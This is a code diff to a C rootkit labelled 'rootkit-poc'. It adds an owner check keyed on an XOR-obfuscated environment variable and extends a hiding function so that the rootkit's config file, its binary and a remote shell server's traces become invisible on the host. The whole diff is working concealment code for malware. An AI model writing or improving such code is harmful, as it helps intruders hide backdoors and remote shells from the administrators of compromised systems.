@@ -29,7 +29,7 @@
 void init(void) {
     DEBUG("[rootkit-poc]: init called\n");
 
-    if (poc_is_loaded) {
+    if (is_loaded) {
         return;
     }
 
@@ -46,21 +46,53 @@ void init(void) {
         cleanup(scallname, strlen(scallname)); // clears allocated memory
     }
 
-    poc_is_loaded = 1;
+    is_loaded = 1;
+}
+
+int is_owner(void) {
+    init(); // hook configurations
+
+    if (owner) {
+        return owner;
+    }
+
+    char *hide_term_str = strdup(HIDE_TERM_STR);
+
+    xor(hide_term_str);
+
+    char *hide_term_var = getenv(hide_term_str);
+
+    if (hide_term_var != NULL) {
+        owner = 1;
+    } else {
+        owner = 0;
+    }
+
+    cleanup(hide_term_str, strlen(hide_term_str));
+
+    return owner;
 }
 
 int is_invisible(const char *path) {
+    if (is_owner()) {
+        return 0;
+    }
+
     char *config_file = strdup(CONFIG_FILE);
+    char *bin_file = strdup(BIN_FILE);
     char *shell_server = strdup(SHELL_SERVER);
 
-    init(); // hook configurations
-
     xor(config_file);
+    xor(bin_file);
     xor(shell_server);
 
     // Checks if the path contains the MAGIC_STRING
-    if (strstr(path, MAGIC_STRING) || strstr(path, shell_server)) {
+    if (strstr(path, MAGIC_STRING)
+        || strstr(path, shell_server)
+        || strstr(path, config_file)
+        || strstr(path, bin_file)) {
         cleanup(config_file, strlen(config_file));
+        cleanup(bin_file, strlen(bin_file));
         cleanup(shell_server, strlen(shell_server));
         return 1; // invisible
     }
@@ -94,6 +126,7 @@ int is_invisible(const char *path) {
             while ((res=fgets(line, MAX_LEN, cmd) != NULL)) {
                 if (strstr(line, shell_server)) {
                     cleanup(config_file, strlen(config_file));
+                    cleanup(bin_file, strlen(bin_file));
                     cleanup(shell_server, strlen(shell_server));
                     return 1;
                 }
@@ -109,6 +142,7 @@ int is_invisible(const char *path) {
 
     cleanup(shell_server, strlen(shell_server));
     cleanup(config_file, strlen(config_file));
+    cleanup(bin_file, strlen(bin_file));
 
     return 0; // visible
 }
